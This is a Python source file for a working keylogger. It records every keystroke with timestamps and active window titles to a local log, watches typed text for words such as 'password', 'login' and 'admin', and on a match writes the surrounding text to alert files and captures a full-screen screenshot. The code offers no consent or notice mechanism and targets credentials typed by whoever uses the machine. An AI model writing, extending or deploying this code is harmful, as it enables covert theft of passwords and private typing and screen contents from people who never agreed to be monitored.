import os
import csv
import time
from datetime import datetime, timedelta
from threading import Thread, Event
from collections import deque
from pynput import keyboard


import platform
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import pygetwindow as gw
except ImportError:
    gw = None


log_file = "data/logs/keystrokes.txt"
alert_file = "data/logs/alerts.txt"
stop_event = Event()
listener_thread = None


key_timestamps = deque()
WINDOW_SECONDS = 60
typed_buffer = ""  
BUFFER_MAX_LENGTH = 200


ALERT_COOLDOWN_MINUTES = 0
last_alert_time = {}  


def is_capslock_on():
    system = platform.system()
    if system == "Windows":
        import ctypes
        return ctypes.windll.user32.GetKeyState(0x14) & 1
    elif system == "Linux":
        import subprocess
        try:
            status = subprocess.check_output("xset q | grep Caps", shell=True).decode()
            return "on" in status
        except Exception:
            return False
    elif system == "Darwin":
        return False  
    return False


def get_active_window():
    if gw:
        try:
            win = gw.getActiveWindow()
            return win.title if win else "Unknown"
        except Exception:
            return "Unknown"
    return "Unknown"


def resolve_char(key):
    if hasattr(key, 'char') and key.char:
        c = key.char
        if is_capslock_on() and c.isalpha():
            return c.upper()
        return c
    specials = {
        keyboard.Key.space: ' ',
        keyboard.Key.enter: '[ENTER]',
        keyboard.Key.tab: '[TAB]',
        keyboard.Key.backspace: '[BACKSPACE]',
        keyboard.Key.delete: '[DELETE]',
    }
    return specials.get(key, f'[{key.name.upper()}]' if hasattr(key, 'name') else '')


def log_key(char):
    global typed_buffer
    if not char:
        return
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")[:-3]
    window = get_active_window()
    line = f"{timestamp}: {window} >> {char}\n"

    os.makedirs("data/logs", exist_ok=True)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(line)

    
    typed_buffer += char
    if len(typed_buffer) > BUFFER_MAX_LENGTH:
        typed_buffer = typed_buffer[-BUFFER_MAX_LENGTH:]

    
    key_timestamps.append(time.time())
    while key_timestamps and key_timestamps[0] < time.time() - WINDOW_SECONDS:
        key_timestamps.popleft()


def check_alert(char):
    global typed_buffer
    trigger_words = ["password", "pass", "pwd", "secret", "login", "admin"]

    for word in trigger_words:
        if word in typed_buffer.lower():
            now = datetime.now()
            last_time = last_alert_time.get(word)

            
            if not last_time or now - last_time >= timedelta(minutes=ALERT_COOLDOWN_MINUTES):
                timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
                window = get_active_window()
                alert_msg = f"[ALERT] Sensitive word '{word}' detected at {timestamp}: {window} >> {typed_buffer}"

                
                os.makedirs("data/logs", exist_ok=True)
                with open(alert_file, "a", encoding="utf-8") as f:
                    f.write(alert_msg + "\n")

                
                csv_path = "data/logs/alerts.csv"
                os.makedirs(os.path.dirname(csv_path), exist_ok=True)
                write_header = not os.path.exists(csv_path) or os.stat(csv_path).st_size == 0
                with open(csv_path, "a", newline="", encoding="utf-8") as csvfile:
                    writer = csv.writer(csvfile)
                    if write_header:
                        writer.writerow(["Timestamp", "Window", "Alert"])
                    writer.writerow([timestamp, window, typed_buffer])

                
                try:
                    from PIL import ImageGrab
                    os.makedirs("data/screenshots", exist_ok=True)
                    screenshot_path = f"data/screenshots/{timestamp}.png"
                    img = ImageGrab.grab()
                    img.save(screenshot_path)
                    print(f"Screenshot saved: {screenshot_path}")
                except Exception as e:
                    print(f"Screenshot error: {e}")

                last_alert_time[word] = now
                print(f"ALERT: {alert_msg}")

            break


def on_press(key):
    if stop_event.is_set():
        return False
    try:
        char = resolve_char(key)
        if char:
            log_key(char)
            check_alert(char)
    except Exception as e:
        print("Key error:", e)
    return True


def start_keylogger():
    global listener_thread
    stop_event.clear()
    listener_thread = Thread(target=run_listener, daemon=True)
    listener_thread.start()

def run_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    stop_event.set()
    return True


def export_alerts_to_csv(output_path):
    try:
        
        os.makedirs(os.path.dirname(output_path), exist_ok=True)

        
        csv_exists = os.path.exists(output_path)

        with open(alert_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        
        with open(output_path, "a", newline="", encoding="utf-8") as csvfile:
            writer = csv.writer(csvfile)
            
            if not csv_exists:
                writer.writerow(["Timestamp", "Window", "Alert"])


            for line in lines:
                if "[ALERT]" in line:
                    parts = line.strip().split(": ", 2)
                    if len(parts) >= 3:
                        ts = parts[1].split(" >> ")[0]
                        rest = parts[2]
                        window = rest.split(" >> ")[0]
                        msg = rest.split(" >> ", 1)[1]


                        writer.writerow([ts, window, msg])

        return True
    except Exception as e:
        print(e)
        return False


def get_keys_per_second():
    now = time.time()
    counts = [0] * WINDOW_SECONDS
    for ts in key_timestamps:
        idx = int(now - ts)
        if 0 <= idx < WINDOW_SECONDS:
            counts[idx] += 1
    return list(reversed(counts))
